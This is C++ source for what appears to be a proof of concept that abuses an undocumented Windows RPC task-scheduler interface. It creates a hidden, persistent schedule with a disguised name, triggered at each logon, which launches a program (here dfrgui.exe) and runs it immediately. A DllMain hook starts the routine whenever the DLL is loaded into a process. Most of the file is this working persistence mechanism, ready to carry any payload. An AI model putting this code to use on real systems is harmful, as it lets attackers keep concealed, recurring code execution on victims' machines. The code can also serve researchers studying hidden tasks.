#include "WPTaskScheduler_h.h"
#include <iostream>
#include <strsafe.h>

#pragma comment(lib, "rpcrt4.lib")

#define TASK_PERSIST_FLAG 0x1
#define TASK_DISABLED_FLAG 0x2

typedef struct _TASK_ACTION_LAUNCH
{
    LPCWSTR ExecPath;
    LPCWSTR ExecArgv;
}TASK_ACTION_LAUNCH, * PTASK_ACTION_LAUNCH;

typedef struct _TASK_ACTION_EVENT
{
    ULONG EventData;
    LPCWSTR EventName;
}TASK_ACTION_EVENT, * PTASK_ACTION_EVENT;

typedef struct _TASK_ACTION
{
    USHORT ActionType; 
    union
    {
        TASK_ACTION_LAUNCH* LaunchAction;
        TASK_ACTION_EVENT* EventAction; // ActionType  = 2 [TASK_ACTION_EVENT]
        //.......
    };
}TASK_ACTION, *PTASK_ACTION;

typedef struct _TASK_TRIGGER_AGGREGATE
{
    USHORT AggregateTriggerType; //0
    ULONG BlockCount;
    struct _TASK_SCHEDULE* Block;
}TASK_TRIGGER_AGGREGATE, * PTASK_TRIGGER_AGGREGATE;

// ERROR Struct, DO NOT USE!!!
typedef struct _TASK_TRIGGER_WNF
{
    ULONG64 WnfValue; //0x4194063ea3bc0835
    USHORT WnfStateTriggerType;
    ULONG Flags;//Flags
    PVOID ExtraData;
    ULONG Data;
    DWORD DataCount;//16
}TASK_TRIGGER_WNF, * PTASK_TRIGGER_WNF;

typedef struct _TASK_TRIGGER
{
    USHORT TriggerType; // TASK_TRIGGER_AGGREGATE = 2
    union
    {
        TASK_TRIGGER_WNF* TaskWnf; //[TASK_TRIGGER_WNFSTATE] = 1
        TASK_TRIGGER_AGGREGATE* TaskAggregate; //聚合体！
    };
}TASK_TRIGGER, * PTASK_TRIGGER;

typedef struct _TASK_SCHEDULE
{
    GUID* pguidName;
    ULONG Flags;
    LPCWSTR ScheduleName;
    SYSTEMTIME BeginTime;//24
    SYSTEMTIME EndTime;
    ULONG MaxRunCount;//0xFFFFFFFF
    TASK_TRIGGER* Trigger;
    TASK_ACTION* Action;
    short StructMember8;
    short StructMember9;
}TASK_SCHEDULE, * PTASK_SCHEDULE;

typedef RPC_STATUS(NTAPI* TaskSchedulerInit_)(RPC_BINDING_HANDLE* Binding);
typedef RPC_STATUS(NTAPI* TaskSchedulerGetSchedule_)(RPC_BINDING_HANDLE Binding, GUID* guid, struct Struct_498_t** arg_2, struct Struct_542_t** arg_3);
typedef RPC_STATUS(NTAPI* TaskSchedulerCreateSchedule_)(RPC_BINDING_HANDLE Binding, TASK_SCHEDULE* lpTaskSchedule, ULONG Flags);

//_TASK_SCHEDULE = 88 个字节
// _TASK_STATISTIC = 40 个字节


// 
// https://www.tenforums.com/general-support/157178-hidden-task-revealer.html
// https://www.tenforums.com/general-support/157178-hidden-task-revealer-6.html
// https://cyber.wtf/2022/06/01/windows-registry-analysis-todays-episode-tasks/
// https://github.com/gtworek/PSBits/tree/master/WNF
// https://googleprojectzero.blogspot.com/2015/05/in-console-able.html
//
//
// 1.exe (By default)
// 1.exe {3fbb87a1-d109-4b8a-ad72-5225cb45b038} (Delete the WPTaskScheduler with guid)
//
int wmain(int argc, wchar_t* argv[])
{
    RPC_BINDING_HANDLE Binding = NULL;
    RPC_WSTR StringBinding = NULL;
    RPC_STATUS Status = 0;
   
    // Fail to Init RPC 
    Status = RpcStringBindingComposeW(
        NULL,
        (RPC_WSTR)L"ncalrpc",
        NULL,
        NULL,
        NULL,
        &StringBinding
    );
    if (Status != 0)
        return -1;

    Status = RpcBindingFromStringBindingW(StringBinding, &Binding);
    Status = RpcStringFreeW(&StringBinding);

    // NdrClientCall* fail to open Directory "\RPC Control\*"


    HRESULT hr = 0;
    WCHAR GuidString[0x100] = { 0 };
    GUID TaskGuid = { 0 };

    if (argc == 2)
    {
        GUID ScheduleGuid = { 0 };
        hr = CLSIDFromString(argv[1], &ScheduleGuid);
        if (hr)
            return hr;

        Status = TaskSchedulerDeleteSchedule(Binding, &ScheduleGuid);
        wprintf(L"[*] Schedule Guid: %ls\n", argv[1]);
        wprintf(L"[*] TaskSchedulerDeleteSchedule: 0x%08lx\n", Status);
        return 0;
    }

    // do not use CoCreateGuid/StringFromGUID2 when we fail to load ole32.dll in sandbox
    hr = CoCreateGuid(&TaskGuid);
    hr = StringFromGUID2(TaskGuid, GuidString, 0x100);
    
    // TaskSchedulerCreateSchedule_  TaskSchedulerCreateSchedule = (TaskSchedulerCreateSchedule_)GetProcAddress(MCCSPalDll, MAKEINTRESOURCEA(11));
    // TaskSchedulerGetSchedule_ TaskSchedulerGetSchedule = (TaskSchedulerGetSchedule_)GetProcAddress(MCCSPalDll, MAKEINTRESOURCEA(13));
    // CeTaskSchedulerInit, CeTaskSchedulerCreateSchedule, HCETASKSCHEDULE ??? MAKE_TSKSCH_SCODE, MAKE_TSKSCH_E, MAKE_TSKSCH_S

    TASK_SCHEDULE WPTaskSchedule = { 0 };    
    WPTaskSchedule.pguidName = &TaskGuid;
    WPTaskSchedule.Flags = 0;
   
    // doesn't matter lol :)
    std::wstring stdScheduleName = L"SimpleActivityScheduleTimer_";
    stdScheduleName += GuidString;

    WPTaskSchedule.ScheduleName = stdScheduleName.c_str();
    WPTaskSchedule.MaxRunCount = INFINITE;
    
    // Toggle Event Handle ?
    //TASK_ACTION_EVENT Event = { 0 };
    //Event.EventData = 0; 
    //Event.EventName = L"\\BaseNamedObjects\\078F6F89-D7AF-460A-A8FC-F5EE518EC546}";

    TASK_ACTION_LAUNCH Launch = { 0 };
    Launch.ExecPath = L"dfrgui.exe";
    Launch.ExecArgv = NULL;

    TASK_ACTION Action = { 0 };
    Action.ActionType = 0;
    //Action.EventAction = &Event; 2
    Action.LaunchAction = &Launch; //0

    WPTaskSchedule.Action = &Action;

    TASK_TRIGGER_WNF TriggerWnf = { 0 };

    // WNF_SHEL_DESKTOP_APPLICATION_STARTED 0xd83063ea3be5075
    // WNF_SHEL_LOGON_COMPLETE  0xd83063ea3bc1875
    // WNF_SHEL_SESSION_LOGON_COMPLETE  0xd83063ea3be3835
    // 0x4194063ea3bc0835
    TriggerWnf.WnfValue = 0xd83063ea3bc1875;
    TriggerWnf.WnfStateTriggerType = 0; // 1 ,2 

    TASK_TRIGGER Trigger = { 0 };
    Trigger.TriggerType = 1;
    Trigger.TaskWnf = &TriggerWnf;

    WPTaskSchedule.Trigger = &Trigger;
    WPTaskSchedule.Flags = TASK_PERSIST_FLAG;

    // First time to execute while 0x1
    Status = TaskSchedulerCreateSchedule(Binding, (Struct_498_t*)&WPTaskSchedule, TRUE);
    wprintf(L"[*] TaskSchedulerCreateSchedule: 0x%08lx\n", Status);
    if (Status != 0)
        return 3;

    wprintf(L"[+] Schedule Guid: %ls\n", GuidString);
    wprintf(L"[+] Schedule Name: %ls\n", stdScheduleName.c_str());

    // Second time to execute Manually via TaskSchedulerExecuteSchedule
    Status = TaskSchedulerExecuteSchedule(Binding, &TaskGuid, 0);
    wprintf(L"[*] TaskSchedulerExecuteSchedule: 0x%08lx\n", Status);
    if (Status != 0)
        return 4;

    //Status = TaskSchedulerEnableSchedule(Binding, &TaskGuid, 1);
    //wprintf(L"[*] TaskSchedulerEnableSchedule: 0x%08lx\n", Status);

    return 0;
}

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wmain, NULL, 0, NULL);
            DisableThreadLibraryCalls(hModule);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}